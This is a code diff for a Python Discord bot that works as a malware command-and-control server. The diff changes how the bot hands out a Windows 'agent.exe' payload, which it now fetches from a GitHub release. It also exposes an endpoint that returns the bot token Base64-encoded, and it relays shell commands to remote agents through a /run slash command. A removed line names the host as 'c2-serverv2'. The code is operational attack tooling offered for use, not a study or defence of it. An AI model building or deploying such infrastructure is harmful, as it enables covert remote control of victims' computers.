@@ -7,7 +7,8 @@ from aiohttp import web
 from datetime import datetime, timezone, timedelta
 import re
 import logging
-import base64  # added for base64 encoding
+import base64
+import aiohttp  # for making HTTP requests to GitHub
 
 # ------------------- CONFIGURATION -------------------
 BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
@@ -17,6 +18,11 @@ AGENT_CHANNEL_PREFIX = os.getenv("AGENT_PREFIX", "agent-")
 STALE_THRESHOLD_MINUTES = int(os.getenv("STALE_THRESHOLD_MINUTES", 5))
 PORT = int(os.getenv("PORT", 10000))
 ADMIN_ROLE_NAME = os.getenv("ADMIN_ROLE", "Admin")
+
+# GitHub release URL for agent.exe (must be a direct download link)
+GITHUB_RELEASE_URL = os.getenv("GITHUB_RELEASE_URL")
+if not GITHUB_RELEASE_URL:
+    raise ValueError("GITHUB_RELEASE_URL environment variable not set")
 
 if not BOT_TOKEN:
     raise ValueError("DISCORD_BOT_TOKEN environment variable not set")
@@ -30,6 +36,37 @@ logging.basicConfig(
     handlers=[logging.StreamHandler()]
 )
 logger = logging.getLogger("bot")
+
+# ------------------- CACHE FOR agent.exe -------------------
+_binary_cache = None
+_cache_timestamp = None
+CACHE_TTL = timedelta(minutes=5)  # how long to keep the cached binary
+
+async def fetch_agent_binary():
+    """Fetch the agent.exe from GitHub release URL, with caching."""
+    global _binary_cache, _cache_timestamp
+    now = datetime.now(timezone.utc)
+
+    # Return cached copy if still fresh
+    if _binary_cache is not None and _cache_timestamp is not None:
+        if now - _cache_timestamp < CACHE_TTL:
+            logger.debug("Returning cached agent binary")
+            return _binary_cache
+
+    logger.info("Fetching agent.exe from GitHub release...")
+    async with aiohttp.ClientSession() as session:
+        try:
+            async with session.get(GITHUB_RELEASE_URL) as resp:
+                if resp.status != 200:
+                    logger.error(f"GitHub returned {resp.status}")
+                    return None
+                data = await resp.read()
+                _binary_cache = data
+                _cache_timestamp = now
+                return data
+        except Exception as e:
+            logger.error(f"Failed to fetch from GitHub: {e}")
+            return None
 
 # ------------------- BOT SETUP -------------------
 intents = discord.Intents.default()
@@ -49,16 +86,16 @@ class MyBot(commands.Bot):
 
 bot = MyBot()
 
-# ------------------- HTTP HEALTH, FILE SERVER & TOKEN ENDPOINT -------------------
+# ------------------- HTTP SERVER HANDLERS -------------------
 async def handle_health(request):
     return web.Response(text="OK")
 
 async def handle_agent_download(request):
-    """Serve the agent binary for self‑updates."""
-    file_path = os.path.join(os.path.dirname(__file__), "agent.exe")
-    if not os.path.exists(file_path):
-        return web.Response(text="Agent binary not found", status=404)
-    return web.FileResponse(file_path)
+    """Serve the agent binary from GitHub release (with caching)."""
+    data = await fetch_agent_binary()
+    if data is None:
+        return web.Response(text="Agent binary unavailable", status=503)
+    return web.Response(body=data, content_type="application/octet-stream")
 
 async def handle_token(request):
     """Return the bot token Base64‑encoded."""
@@ -72,14 +109,14 @@ app = web.Application()
 app.router.add_get("/", handle_health)
 app.router.add_get("/health", handle_health)
 app.router.add_get("/agent.exe", handle_agent_download)
-app.router.add_get("/hi", handle_token)  # new token endpoint
+app.router.add_get("/hi", handle_token)
 
 async def start_http_server():
     runner = web.AppRunner(app)
     await runner.setup()
     site = web.TCPSite(runner, "0.0.0.0", PORT)
     await site.start()
-    logger.info(f"Health check server running on port {PORT}")
+    logger.info(f"HTTP server running on port {PORT}")
 
 # ------------------- BACKGROUND CLEANUP TASK -------------------
 @tasks.loop(minutes=1)
@@ -144,26 +181,14 @@ async def send_command_to_agent(interaction: discord.Interaction, cmd_text: str,
     await interaction.response.send_message(f"✅ Command `{cmd_text}` sent to agent.", ephemeral=ephemeral)
     return True
 
-# ------------------- ADMIN UPLOAD COMMAND -------------------
-@bot.tree.command(name="upload_agent", description="Upload a new agent binary (Admin only)")
-async def upload_agent(interaction: discord.Interaction, file: discord.Attachment):
-    if not any(role.name == ADMIN_ROLE_NAME for role in interaction.user.roles):
-        await interaction.response.send_message("❌ You don't have permission to use this command.", ephemeral=True)
-        return
-    if not file.filename.endswith(".exe"):
-        await interaction.response.send_message("❌ File must be an .exe", ephemeral=True)
-        return
-    await interaction.response.defer(ephemeral=True, thinking=True)
-    file_path = os.path.join(os.path.dirname(__file__), "agent.exe")
-    try:
-        await file.save(file_path)
-        logger.info(f"New agent binary uploaded by {interaction.user}")
-        await interaction.followup.send(f"✅ Agent binary updated successfully. New version available at `https://c2-serverv2-qxvl.onrender.com/agent.exe`", ephemeral=True)
-    except Exception as e:
-        logger.error(f"Failed to save agent binary: {e}")
-        await interaction.followup.send(f"❌ Failed to save file: {e}", ephemeral=True)
+# ------------------- REMOVED /upload_agent COMMAND -------------------
+# The upload command is no longer needed; updates are handled via GitHub release.
+# If you still want a placeholder, you can add:
+# @bot.tree.command(name="upload_agent", description="[Deprecated] Updates are now via GitHub")
+# async def upload_agent(interaction: discord.Interaction):
+#     await interaction.response.send_message("❌ Manual upload is disabled. Update the GitHub release instead.", ephemeral=True)
 
-# ------------------- SLASH COMMANDS -------------------
+# ------------------- SLASH COMMANDS (unchanged except removed upload) -------------------
 @bot.tree.command(name="run", description="Execute a shell command")
 async def run_command(interaction: discord.Interaction, command: str):
     await send_command_to_agent(interaction, f"run {command}")
